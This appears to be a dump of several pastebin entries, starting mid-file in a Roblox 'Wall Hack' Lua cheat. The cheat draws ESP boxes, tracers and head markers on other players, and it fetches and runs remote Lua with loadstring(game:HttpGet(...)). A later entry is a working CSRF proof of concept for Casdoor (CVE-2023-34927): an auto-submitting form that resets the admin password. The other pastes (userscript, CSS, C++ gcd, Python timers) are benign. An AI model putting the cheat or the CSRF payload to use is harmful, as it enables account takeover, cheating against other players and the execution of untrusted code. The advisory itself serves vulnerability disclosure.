                    if Environment.Settings.AliveCheck then
                        Checks.Alive = (Player.Character:FindFirstChild(""Humanoid"").Health > 0)
                    else
                        Checks.Alive = true
                    end

                    if Environment.Settings.TeamCheck then
                        Checks.Team = (Player.TeamColor ~= LocalPlayer.TeamColor)
                    else
                        Checks.Team = true
                    end

                    if Checks.Alive and Checks.Team then
                        PlayerTable.ESP.Visible = true
                    else
                        PlayerTable.ESP.Visible = false
                    end

                    if PlayerTable.ESP.Visible then
                        UpdateESP()
                    end
                end
            else
                PlayerTable.ESP.Visible = false
            end
        else
            PlayerTable.ESP.Visible = false
        end
    end)
end

local function AddTracer(Player)
    local PlayerTable = GetPlayerTable(Player)

    PlayerTable.Tracer = Drawingnew(""Line"")

    PlayerTable.Connections.Tracer = RunService.RenderStepped:Connect(function()
        if Player.Character and Player.Character:FindFirstChild(""Humanoid"") and Player.Character:FindFirstChild(""HumanoidRootPart"") and Environment.Settings.Enabled then
            local HRPCFrame, HRPSize = Player.Character.HumanoidRootPart.CFrame, Player.Character.HumanoidRootPart.Size
            local Vector, OnScreen = Camera:WorldToViewportPoint(HRPCFrame * CFrame.new(0, -HRPSize.Y, 0).Position)

            PlayerTable.Tracer.Visible = Environment.Visuals.TracersSettings.Enabled

            local function UpdateTracer()
                PlayerTable.Tracer.Thickness = Environment.Visuals.TracersSettings.Thickness
                PlayerTable.Tracer.Color = GetColor(Environment.Visuals.TracersSettings.Color)
                PlayerTable.Tracer.Transparency = Environment.Visuals.TracersSettings.Transparency

                PlayerTable.Tracer.To = Vector2new(Vector.X, Vector.Y)

                if Environment.Visuals.TracersSettings.Type == 1 then
                    PlayerTable.Tracer.From = Vector2new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                elseif Environment.Visuals.TracersSettings.Type == 2 then
                    PlayerTable.Tracer.From = Vector2new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
                elseif Environment.Visuals.TracersSettings.Type == 3 then
                    PlayerTable.Tracer.From = Vector2new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y)
                else
                    PlayerTable.Tracer.From = Vector2new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                end
            end

            if OnScreen then
                if Environment.Visuals.TracersSettings.Enabled then
                    local Checks = {Alive = true, Team = true}

                    if Environment.Settings.AliveCheck then
                        Checks.Alive = (Player.Character:FindFirstChild(""Humanoid"").Health > 0)
                    else
                        Checks.Alive = true
                    end

                    if Environment.Settings.TeamCheck then
                        Checks.Team = (Player.TeamColor ~= LocalPlayer.TeamColor)
                    else
                        Checks.Team = true
                    end

                    if Checks.Alive and Checks.Team then
                        PlayerTable.Tracer.Visible = true
                    else
                        PlayerTable.Tracer.Visible = false
                    end

                    if PlayerTable.Tracer.Visible then
                        UpdateTracer()
                    end
                end
            else
                PlayerTable.Tracer.Visible = false
            end
        else
            PlayerTable.Tracer.Visible = false
        end
    end)
end

local function AddBox(Player)
    local PlayerTable = GetPlayerTable(Player)

    PlayerTable.Box.Square = Drawingnew(""Square"")

    PlayerTable.Box.TopLeftLine = Drawingnew(""Line"")
    PlayerTable.Box.TopLeftLine = Drawingnew(""Line"")
    PlayerTable.Box.TopRightLine = Drawingnew(""Line"")
    PlayerTable.Box.BottomLeftLine = Drawingnew(""Line"")
    PlayerTable.Box.BottomRightLine = Drawingnew(""Line"")

    PlayerTable.Connections.Box = RunService.RenderStepped:Connect(function()
        if Player.Character and Player.Character:FindFirstChild(""Humanoid"") and Player.Character:FindFirstChild(""Head"") and Player.Character:FindFirstChild(""HumanoidRootPart"") and Environment.Settings.Enabled then
            local Vector, OnScreen = Camera:WorldToViewportPoint(Player.Character.HumanoidRootPart.Position)

            local HRPCFrame, HRPSize = Player.Character.HumanoidRootPart.CFrame, Player.Character.HumanoidRootPart.Size * Environment.Visuals.BoxSettings.Increase

            local TopLeftPosition = Camera:WorldToViewportPoint(HRPCFrame * CFrame.new(HRPSize.X,  HRPSize.Y, 0).Position)
            local TopRightPosition = Camera:WorldToViewportPoint(HRPCFrame * CFrame.new(-HRPSize.X,  HRPSize.Y, 0).Position)
            local BottomLeftPosition = Camera:WorldToViewportPoint(HRPCFrame * CFrame.new(HRPSize.X, -HRPSize.Y, 0).Position)
            local BottomRightPosition = Camera:WorldToViewportPoint(HRPCFrame * CFrame.new(-HRPSize.X, -HRPSize.Y, 0).Position)

            local HeadOffset = Camera:WorldToViewportPoint(Player.Character.Head.Position + Vector3new(0, 0.5, 0))
			local LegsOffset = Camera:WorldToViewportPoint(Player.Character.HumanoidRootPart.Position - Vector3new(0, 3, 0))

            local function Visibility(Bool)
                if Environment.Visuals.BoxSettings.Type == 1 then
                    PlayerTable.Box.Square.Visible = not Bool

                    PlayerTable.Box.TopLeftLine.Visible = Bool
                    PlayerTable.Box.TopRightLine.Visible = Bool
                    PlayerTable.Box.BottomLeftLine.Visible = Bool
                    PlayerTable.Box.BottomRightLine.Visible = Bool
                elseif Environment.Visuals.BoxSettings.Type == 2 then
                    PlayerTable.Box.Square.Visible = Bool

                    PlayerTable.Box.TopLeftLine.Visible = not Bool
                    PlayerTable.Box.TopRightLine.Visible = not Bool
                    PlayerTable.Box.BottomLeftLine.Visible = not Bool
                    PlayerTable.Box.BottomRightLine.Visible = not Bool
                end
            end

            local function Visibility2(Bool)
                PlayerTable.Box.Square.Visible = Bool

                PlayerTable.Box.TopLeftLine.Visible = Bool
                PlayerTable.Box.TopRightLine.Visible = Bool
                PlayerTable.Box.BottomLeftLine.Visible = Bool
                PlayerTable.Box.BottomRightLine.Visible = Bool
            end

            Visibility(Environment.Visuals.BoxSettings.Enabled)

            local function Update2DBox()
                PlayerTable.Box.Square.Thickness = Environment.Visuals.BoxSettings.Thickness
                PlayerTable.Box.Square.Color = GetColor(Environment.Visuals.BoxSettings.Color)
                PlayerTable.Box.Square.Transparency = Environment.Visuals.BoxSettings.Transparency
                PlayerTable.Box.Square.Filled = Environment.Visuals.BoxSettings.Filled

                PlayerTable.Box.Square.Size = Vector2new(2000 / Vector.Z, HeadOffset.Y - LegsOffset.Y)
				PlayerTable.Box.Square.Position = Vector2new(Vector.X - PlayerTable.Box.Square.Size.X / 2, Vector.Y - PlayerTable.Box.Square.Size.Y / 2)
            end

            local function Update3DBox()
                PlayerTable.Box.TopLeftLine.Thickness = Environment.Visuals.BoxSettings.Thickness
                PlayerTable.Box.TopLeftLine.Transparency = Environment.Visuals.BoxSettings.Transparency
                PlayerTable.Box.TopLeftLine.Color = GetColor(Environment.Visuals.BoxSettings.Color)

                PlayerTable.Box.TopRightLine.Thickness = Environment.Visuals.BoxSettings.Thickness
                PlayerTable.Box.TopRightLine.Transparency = Environment.Visuals.BoxSettings.Transparency
                PlayerTable.Box.TopRightLine.Color = GetColor(Environment.Visuals.BoxSettings.Color)

                PlayerTable.Box.BottomLeftLine.Thickness = Environment.Visuals.BoxSettings.Thickness
                PlayerTable.Box.BottomLeftLine.Transparency = Environment.Visuals.BoxSettings.Transparency
                PlayerTable.Box.BottomLeftLine.Color = GetColor(Environment.Visuals.BoxSettings.Color)

                PlayerTable.Box.BottomRightLine.Thickness = Environment.Visuals.BoxSettings.Thickness
                PlayerTable.Box.BottomRightLine.Transparency = Environment.Visuals.BoxSettings.Transparency
                PlayerTable.Box.BottomRightLine.Color = GetColor(Environment.Visuals.BoxSettings.Color)

                PlayerTable.Box.TopLeftLine.From = Vector2new(TopLeftPosition.X, TopLeftPosition.Y)
                PlayerTable.Box.TopLeftLine.To = Vector2new(TopRightPosition.X, TopRightPosition.Y)

                PlayerTable.Box.TopRightLine.From = Vector2new(TopRightPosition.X, TopRightPosition.Y)
                PlayerTable.Box.TopRightLine.To = Vector2new(BottomRightPosition.X, BottomRightPosition.Y)

                PlayerTable.Box.BottomLeftLine.From = Vector2new(BottomLeftPosition.X, BottomLeftPosition.Y)
                PlayerTable.Box.BottomLeftLine.To = Vector2new(TopLeftPosition.X, TopLeftPosition.Y)

                PlayerTable.Box.BottomRightLine.From = Vector2new(BottomRightPosition.X, BottomRightPosition.Y)
                PlayerTable.Box.BottomRightLine.To = Vector2new(BottomLeftPosition.X, BottomLeftPosition.Y)
            end

            if OnScreen then
                if Environment.Visuals.BoxSettings.Enabled then
                    local Checks = {Alive = true, Team = true}

                    if Environment.Settings.AliveCheck then
                        Checks.Alive = (Player.Character:FindFirstChild(""Humanoid"").Health > 0)
                    else
                        Checks.Alive = true
                    end

                    if Environment.Settings.TeamCheck then
                        Checks.Team = (Player.TeamColor ~= LocalPlayer.TeamColor)
                    else
                        Checks.Team = true
                    end

                    if Checks.Alive and Checks.Team then
                        Visibility(true)
                    else
                        Visibility2(false)
                    end

                    if PlayerTable.Box.Square.Visible and not PlayerTable.Box.TopLeftLine.Visible and not PlayerTable.Box.TopRightLine.Visible and not PlayerTable.Box.BottomLeftLine.Visible and not PlayerTable.Box.BottomRightLine.Visible then
                        Update2DBox()
                    elseif not PlayerTable.Box.Square.Visible and PlayerTable.Box.TopLeftLine.Visible and PlayerTable.Box.TopRightLine.Visible and PlayerTable.Box.BottomLeftLine.Visible and PlayerTable.Box.BottomRightLine.Visible then
                        Update3DBox()
                    end
                end
            else
                PlayerTable.Box.Square.Visible = false
                PlayerTable.Box.TopLeftLine.Visible = false
                PlayerTable.Box.TopRightLine.Visible = false
                PlayerTable.Box.BottomLeftLine.Visible = false
                PlayerTable.Box.BottomRightLine.Visible = false
            end
        else
            PlayerTable.Box.Square.Visible = false
            PlayerTable.Box.TopLeftLine.Visible = false
            PlayerTable.Box.TopRightLine.Visible = false
            PlayerTable.Box.BottomLeftLine.Visible = false
            PlayerTable.Box.BottomRightLine.Visible = false
        end
    end)
end

local function AddHeadDot(Player)
    local PlayerTable = GetPlayerTable(Player)

    PlayerTable.HeadDot = Drawingnew(""Circle"")

    PlayerTable.Connections.HeadDot = RunService.RenderStepped:Connect(function()
        if Player.Character and Player.Character:FindFirstChild(""Humanoid"") and Player.Character:FindFirstChild(""Head"") and Environment.Settings.Enabled then
            local Vector, OnScreen = Camera:WorldToViewportPoint(Player.Character.Head.Position)

            PlayerTable.HeadDot.Visible = Environment.Visuals.HeadDotSettings.Enabled

            local function UpdateHeadDot()
                PlayerTable.HeadDot.Thickness = Environment.Visuals.HeadDotSettings.Thickness
                PlayerTable.HeadDot.Color = GetColor(Environment.Visuals.HeadDotSettings.Color)
                PlayerTable.HeadDot.Transparency = Environment.Visuals.HeadDotSettings.Transparency
                PlayerTable.HeadDot.NumSides = Environment.Visuals.HeadDotSettings.Sides
                PlayerTable.HeadDot.Filled = Environment.Visuals.HeadDotSettings.Filled
                PlayerTable.HeadDot.Radius = Environment.Visuals.HeadDotSettings.Size

                PlayerTable.HeadDot.Position = Vector2new(Vector.X, Vector.Y)
            end

            if OnScreen then
                if Environment.Visuals.HeadDotSettings.Enabled then
                    local Checks = {Alive = true, Team = true}

                    if Environment.Settings.AliveCheck then
                        Checks.Alive = (Player.Character:FindFirstChild(""Humanoid"").Health > 0)
                    else
                        Checks.Alive = true
                    end

                    if Environment.Settings.TeamCheck then
                        Checks.Team = (Player.TeamColor ~= LocalPlayer.TeamColor)
                    else
                        Checks.Team = true
                    end

                    if Checks.Alive and Checks.Team then
                        PlayerTable.HeadDot.Visible = true
                    else
                        PlayerTable.HeadDot.Visible = false
                    end

                    if PlayerTable.HeadDot.Visible then
                        UpdateHeadDot()
                    end
                end
            else
                PlayerTable.HeadDot.Visible = false
            end
        else
            PlayerTable.HeadDot.Visible = false
        end
    end)
end
--[[
local function AddCrosshair()
    local AxisX, AxisY = nil, nil

    pcall(function()
        ServiceConnections.AxisConnection, ServiceConnections.CrosshairConnection = RunService.RenderStepped:Connect(function()
            if Environment.Crosshair.CrosshairSettings.Type == 1 then
                AxisX, AxisY = UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y
            elseif Environment.Crosshair.CrosshairSettings.Type == 2 then
                AxisX, AxisY = Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2
            else
                Environment.Crosshair.CrosshairSettings.Type = 1
            end
        end), RunService.RenderStepped:Connect(function()

            repeat wait() until AxisX and AxisY

            --// Left Line

            Environment.Crosshair.Parts.LeftLine.Visible = Environment.Settings.Enabled
            Environment.Crosshair.Parts.LeftLine.Color = GetColor(Environment.Crosshair.CrosshairSettings.Color)
            Environment.Crosshair.Parts.LeftLine.Thickness = Environment.Crosshair.CrosshairSettings.Thickness
            Environment.Crosshair.Parts.LeftLine.Transparency = Environment.Crosshair.CrosshairSettings.Transparency

            Environment.Crosshair.Parts.LeftLine.From = Vector2new(AxisX + Environment.Crosshair.CrosshairSettings.GapSize, AxisY)
            Environment.Crosshair.Parts.LeftLine.To = Vector2new(AxisX + Environment.Crosshair.CrosshairSettings.Size, AxisY)

            --// Right Line

            Environment.Crosshair.Parts.RightLine.Visible = Environment.Settings.Enabled
            Environment.Crosshair.Parts.RightLine.Color = GetColor(Environment.Crosshair.CrosshairSettings.Color)
            Environment.Crosshair.Parts.RightLine.Thickness = Environment.Crosshair.CrosshairSettings.Thickness
            Environment.Crosshair.Parts.RightLine.Transparency = Environment.Crosshair.CrosshairSettings.Transparency

            Environment.Crosshair.Parts.RightLine.From = Vector2new(AxisX - Environment.Crosshair.CrosshairSettings.GapSize, AxisY)
            Environment.Crosshair.Parts.RightLine.To = Vector2new(AxisX - Environment.Crosshair.CrosshairSettings.Size, AxisY)

            --// Top Line

            Environment.Crosshair.Parts.TopLine.Visible = Environment.Settings.Enabled
            Environment.Crosshair.Parts.TopLine.Color = GetColor(Environment.Crosshair.CrosshairSettings.Color)
            Environment.Crosshair.Parts.TopLine.Thickness = Environment.Crosshair.CrosshairSettings.Thickness
            Environment.Crosshair.Parts.TopLine.Transparency = Environment.Crosshair.CrosshairSettings.Transparency

            Environment.Crosshair.Parts.TopLine.From = Vector2new(AxisX, AxisY + Environment.Crosshair.CrosshairSettings.GapSize)
            Environment.Crosshair.Parts.TopLine.To = Vector2new(AxisX, AxisY + Environment.Crosshair.CrosshairSettings.Size)

            --// Bottom Line

            Environment.Crosshair.Parts.BottomLine.Visible = Environment.Settings.Enabled
            Environment.Crosshair.Parts.BottomLine.Color = GetColor(Environment.Crosshair.CrosshairSettings.Color)
            Environment.Crosshair.Parts.BottomLine.Thickness = Environment.Crosshair.CrosshairSettings.Thickness
            Environment.Crosshair.Parts.BottomLine.Transparency = Environment.Crosshair.CrosshairSettings.Transparency

            Environment.Crosshair.Parts.BottomLine.From = Vector2new(AxisX, AxisY - Environment.Crosshair.CrosshairSettings.GapSize)
            Environment.Crosshair.Parts.BottomLine.To = Vector2new(AxisX, AxisY - Environment.Crosshair.CrosshairSettings.Size)

            --// Center Dot

            Environment.Crosshair.Parts.CenterDot.Visible = Environment.Settings.Enabled and Environment.Crosshair.CrosshairSettings.CenterDot
            Environment.Crosshair.Parts.CenterDot.Color = GetColor(Environment.Crosshair.CrosshairSettings.CenterDotColor)
            Environment.Crosshair.Parts.CenterDot.Radius = Environment.Crosshair.CrosshairSettings.CenterDotSize
            Environment.Crosshair.Parts.CenterDot.Transparency = Environment.Crosshair.CrosshairSettings.CenterDotTransparency
            Environment.Crosshair.Parts.CenterDot.Filled = Environment.Crosshair.CrosshairSettings.CenterDotFilled

            Environment.Crosshair.Parts.CenterDot.Position = Vector2new(AxisX, AxisY)
        end)
    end)
end]]--

--// Functions

local function SaveSettings()
    if isfile(Title..""/""..FileNames[1]..""/""..FileNames[2]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[2], Encode(Environment.Settings))
    end

    if isfile(Title..""/""..FileNames[1]..""/""..FileNames[3]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[3], Encode(Environment.Visuals))
    end

    if isfile(Title..""/""..FileNames[1]..""/""..FileNames[4]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[4], Encode(Environment.Crosshair.CrosshairSettings))
    end
end

local function Wrap(Player)
    local Table, Value = nil, {Name = Player.Name, Connections = {}, ESP = nil, Tracer = nil, HeadDot = nil, Box = {Square = nil, TopLeftLine = nil, TopRightLine = nil, BottomLeftLine = nil, BottomRightLine = nil}}

    for _, v in next, Environment.WrappedPlayers do
        if v[1] == Player.Name then
            Table = v
        end
    end

    if not Table then
        Environment.WrappedPlayers[#Environment.WrappedPlayers + 1] = Value

        AddESP(Player)
        AddTracer(Player)
        AddBox(Player)
        AddHeadDot(Player)
        AddCrosshair()
    end
end

local function UnWrap(Player)
    local Table, Index = nil, nil

    for i, v in next, Environment.WrappedPlayers do
        if v.Name == Player.Name then
            Table, Index = v, i
        end
    end

    if Table then
        for _, v in next, Table.Connections do
            v:Disconnect()
        end

        Table.ESP:Remove()
        Table.Tracer:Remove()
        Table.HeadDot:Remove()

        for _, v in next, Table.Box do
            v:Remove()
        end

        Environment.WrappedPlayers[Index] = nil
    end
end

local function Load()
    for _, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer then
            UnWrap(v)
        end
    end

    for _, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer then
            Wrap(v)
        end
    end

    ServiceConnections.PlayerAddedConnection = Players.PlayerAdded:Connect(function(v)
        if v ~= LocalPlayer then
            Wrap(v)
        end
    end)

    ServiceConnections.PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(v)
        if v ~= LocalPlayer then
            UnWrap(v)
        else
            SaveSettings()
        end
    end)
end

--// Create, Save & Load Settings

if Environment.Settings.SaveSettings then
    if not isfolder(Title) then
        makefolder(Title)
    end

    if not isfolder(Title..""/""..FileNames[1]) then
        makefolder(Title..""/""..FileNames[1])
    end

    if not isfile(Title..""/""..FileNames[1]..""/""..FileNames[2]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[2], Encode(Environment.Settings))
    else
        Environment.Settings = Decode(readfile(Title..""/""..FileNames[1]..""/""..FileNames[2]))
    end

    if not isfile(Title..""/""..FileNames[1]..""/""..FileNames[3]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[3], Encode(Environment.Visuals))
    else
        Environment.Visuals = Decode(readfile(Title..""/""..FileNames[1]..""/""..FileNames[3]))
    end

    if not isfile(Title..""/""..FileNames[1]..""/""..FileNames[4]) then
        writefile(Title..""/""..FileNames[1]..""/""..FileNames[4], Encode(Environment.Crosshair.CrosshairSettings))
    else
        Environment.Crosshair.CrosshairSettings = Decode(readfile(Title..""/""..FileNames[1]..""/""..FileNames[4]))
    end

    coroutinewrap(function()
        while wait(10) do
            SaveSettings()
        end
    end)()
else
    if isfolder(Title) then
        delfolder(Title)
    end
end

--// API Check

if not Drawing or not writefile or not makefolder then
    SendNotification(Title, ""Your exploit does not support this script"", 3); return
end

--// Script Functions

Environment.Functions = {}

function Environment.Functions:Exit()
    SaveSettings()

    for _, v in next, ServiceConnections do
        v:Disconnect()
    end

    for _, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer then
            UnWrap(v)
        end
    end

    for _, v in next, Environment.Crosshair.Parts do
        v:Remove()
    end

    getgenv().WallHack = nil
end

function Environment.Functions:Restart()
    SaveSettings()

    for _, v in next, ServiceConnections do
        v:Disconnect()
    end

    for _, v in next, Players:GetPlayers() do
        if v ~= LocalPlayer then
            UnWrap(v)
        end
    end

    for _, v in next, Environment.Crosshair.Parts do
        v:Remove()
    end

    Load()
end

function Environment.Functions:ResetSettings()
    local Parts = {
        LeftLine = Environment.Crosshair.Parts.LeftLine,
        RightLine = Environment.Crosshair.Parts.RightLine,
        TopLine = Environment.Crosshair.Parts.TopLine,
        BottomLine = Environment.Crosshair.Parts.BottomLine,
        CenterDot = Environment.Crosshair.Parts.CenterDot
    }

    loadstring(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/Wall-Hack/main/Resources/Scripts/Manual%20Factory%20Reset%20Settings.lua""))()
    
    Environment.Crosshair.Parts = Parts

    SaveSettings()
end

function Environment.Functions:GetDocumentation()
    setclipboard(""https://github.com/Exunys/Wall-Hack""); SendNotification(Title, ""GitHub Documentation Page copied to clipboard!"", 3)
end

--// Main

Load(); SendNotification(Title, ""Wall Hack successfully loaded! Check the Discord server on how to configure the script."", 5)

--// Reload On Teleport

if Environment.Settings.ReloadOnTeleport then
    local queueonteleport = queue_on_teleport or syn.queue_on_teleport

    if queue_on_teleport then
        queue_on_teleport(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/Wall-Hack/main/Resources/Scripts/Main.lua""))
    else
        SendNotification(Title, ""Exploit Unsupported. \""syn.queue_on_teleport()\"""")
    end
end"
T6uiVUhE,data893,TestGuy1,JSON,Thursday 11th of April 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '51a0ede776ce78c20bb3efb93c62383b2f09f8eed3d951b08903d568164bd43b551e48f408b89f303f929e0a883b18872595195659121a5a27be7a4d0194fffc2315f6e15fb82d30fb475799ae70c30eee2e45f9ef6b36639fe7403a760029af5970ea5524bd0d2c6d4640d168e9ba8bd18f67a6d0ccf6a2ab9cfdbc150d5a48',
  otherdata: [
    'e435c4b8be0634619ba7e5945d117096',
    '8d7b90ecd95e3f88df9157c6b86357a7',
    '666f3841b3c4d06f03116709c918b24d',
    'b45541730b6bcf112f393c919fd73fe8',
    'df02254b622f1619de18e27e7560b0e5',
    '661928bf2bb1392cf8c991febeb0d170',
    'f3213f428b45738258a0501200beef1b',
    'c81071f6780ae0bf3712797a3f0e5714'
  ]
}"
Me4S1Mge,Casdoor < v1.331.0 - '/api/set-password' CSRF - CVE-2023-34927,FlyFar,Email,Thursday 11th of April 2024 05:51:21 AM CDT,"# Exploit Title: Casdoor < v1.331.0 - '/api/set-password' CSRF
# Application: Casdoor
# Version: <= 1.331.0
# Date: 03/07/2024
# Exploit Author: Van Lam Nguyen 
# Vendor Homepage: https://casdoor.org/
# Software Link: https://github.com/casdoor/casdoor
# Tested on: Windows
# CVE : CVE-2023-34927

Overview
==================================================
Casdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. 
This vulnerability allows attackers to arbitrarily change the victim user's password by supplying a crafted URL.

Proof of Concept
==================================================

Made an unauthorized request to /api/set-password that bypassed the old password entry authentication step

<html>
<form action=""http://localhost:8000/api/set-password"" method=""POST"">
    <input name='userOwner' value='built&#45;in' type='hidden'>
    <input name='userName' value='admin' type='hidden'>
    <input name='newPassword' value='hacked' type='hidden'>
    <input type=submit>
</form>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>

</html>

If a user is logged into the Casdoor Webapp at the time of execution, a new user will be created in the app with the following credentials

userOwner: built&#45;in
userName: admin
newPassword: hacked
            "
uh96rBzE,https://app.lepota.site/,valeraplusplus,JavaScript,Thursday 11th of April 2024 05:29:43 AM CDT,"// ==UserScript==
// @name         Shortcut Tracker
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Tracks Ctrl \ key combination on https://app.lepota.site/ and toggles styles
// @author       Your Name
// @match        https://app.lepota.site/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var ctrlPressed = false;

    // Добавляем стили
    var style = document.createElement('style');
    style.innerHTML = `
.ant-layout-content.hide aside {
    opacity: 0;
    pointer-events: none;
}
.ant-layout-content.hide {
    pointer-events: none;
}
.ant-layout-content.hide div[class^=styled__ZoomButtonsWrapper] {
    opacity: 0;
    pointer-events: none;
}
    `;
    document.head.appendChild(style);

    document.addEventListener('keydown', function(event) {
        if (event.ctrlKey && event.key === ""\\"") {
            ctrlPressed = true;
        }
    });

    document.addEventListener('keyup', function(event) {
        if( window.location.pathname.match('editor') ){
            if (ctrlPressed && event.key === ""\\"") {
                ctrlPressed = false;
                toggleStyles();
            }
        }
    });

    function toggleStyles() {
        var layoutContent = document.querySelector('.ant-layout-content');
        if (layoutContent) {
            layoutContent.classList.toggle('hide');
        }
    }
})();
"
wTJ4zESE,Eem Boxout Borders,demondownload,CSS,Thursday 11th of April 2024 05:28:31 AM CDT,"blockquote.sidebar {
  &::before {
    content: """";
    background: #cc9133;
    position: absolute;
    top: -5px;
    left: -5px;
    width: calc(100% + 10px);
    height: calc(100% + 10px);
    z-index: 0;
    --inset: 0.4rem;
    --border: 1px;
    clip-path: polygon(
      0 var(--inset),
      var(--inset) var(--inset),
      var(--inset) 0,
      calc(100% - var(--inset)) 0,
      calc(100% - var(--inset)) var(--inset),
      100% var(--inset),
      100% calc(100% - var(--inset)),
      calc(100% - var(--inset)) calc(100% - var(--inset)),
      calc(100% - var(--inset)) 100%,
      var(--inset) 100%,
      var(--inset) calc(100% - var(--inset)),
      0 calc(100% - var(--inset)),
      0 50%,
      var(--border) 50%,
      var(--border) calc(100% - var(--inset) - var(--border)),
      calc(var(--inset) + var(--border))
        calc(100% - var(--inset) - var(--border)),
      calc(var(--inset) + var(--border)) calc(100% - var(--border)),
      calc(100% - var(--inset) - var(--border)) calc(100% - var(--border)),
      calc(100% - var(--inset) - var(--border))
        calc(100% - var(--inset) - var(--border)),
      calc(100% - var(--border)) calc(100% - var(--inset) - var(--border)),
      calc(100% - var(--border)) calc(var(--inset) + var(--border)),
      calc(100% - var(--inset) - var(--border))
        calc(var(--inset) + var(--border)),
      calc(100% - var(--inset) - var(--border)) var(--border),
      calc(var(--inset) + var(--border)) var(--border),
      calc(var(--inset) + var(--border)) calc(var(--inset) + var(--border)),
      var(--border) calc(var(--inset) + var(--border)),
      var(--border) 50%,
      0 50%
    );
  }

  &::after {
    content: """";
    background: #cc9133;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
    --inset: 0.2rem;
    --border: 1px;
    clip-path: polygon(
      0 var(--inset),
      var(--inset) var(--inset),
      var(--inset) 0,
      calc(100% - var(--inset)) 0,
      calc(100% - var(--inset)) var(--inset),
      100% var(--inset),
      100% calc(100% - var(--inset)),
      calc(100% - var(--inset)) calc(100% - var(--inset)),
      calc(100% - var(--inset)) 100%,
      var(--inset) 100%,
      var(--inset) calc(100% - var(--inset)),
      0 calc(100% - var(--inset)),
      0 50%,
      var(--border) 50%,
      var(--border) calc(100% - var(--inset) - var(--border)),
      calc(var(--inset) + var(--border))
        calc(100% - var(--inset) - var(--border)),
      calc(var(--inset) + var(--border)) calc(100% - var(--border)),
      calc(100% - var(--inset) - var(--border)) calc(100% - var(--border)),
      calc(100% - var(--inset) - var(--border))
        calc(100% - var(--inset) - var(--border)),
      calc(100% - var(--border)) calc(100% - var(--inset) - var(--border)),
      calc(100% - var(--border)) calc(var(--inset) + var(--border)),
      calc(100% - var(--inset) - var(--border))
        calc(var(--inset) + var(--border)),
      calc(100% - var(--inset) - var(--border)) var(--border),
      calc(var(--inset) + var(--border)) var(--border),
      calc(var(--inset) + var(--border)) calc(var(--inset) + var(--border)),
      var(--border) calc(var(--inset) + var(--border)),
      var(--border) 50%,
      0 50%
    );
  }
}
"
GmYPin9v,Untitled,35657,C++,Thursday 11th of April 2024 05:25:00 AM CDT,"#include <iostream>


using namespace std;

int g_c_d(int a, int b) {
	if (a == b) {
		return a;
	}
	return a > b ? g_c_d(a - b, b) : g_c_d(a, b - a);
}


int main() {
	setlocale(LC_ALL, ""ru"");

	cout << g_c_d(3, 8) << endl;
	cout << g_c_d(25, 125) << endl;
	cout << g_c_d(6, 9) << endl;
}
"
VybuBJGP,Cool python code that is a 10 minute timer,Mryeetmemes,Python,Thursday 11th of April 2024 05:18:12 AM CDT,"import time

def countdown_timer(duration):
    while duration > 0:
        mins, secs = divmod(duration, 60)
        timer_display = '{:02d}:{:02d}'.format(mins, secs)
        print(timer_display, end='\r')
        time.sleep(1)
        duration -= 1
    print(""Timer complete!"")

duration = 10 * 60  # 10 minutes
countdown_timer(duration)"
7i3qAL10,Cool Python Code that is a 1 Minute Timer,Mryeetmemes,Python,Thursday 11th of April 2024 05:17:08 AM CDT,"import time

def countdown_timer(duration):
    while duration > 0:
        mins, secs = divmod(duration, 60)
        timer_display = '{:02d}:{:02d}'.format(mins, secs)
        print(timer_display, end='\r')
        time.sleep(1)
        duration -= 1
    print(""Timer complete!"")

duration = 60  # 1 minute
countdown_timer(duration)"
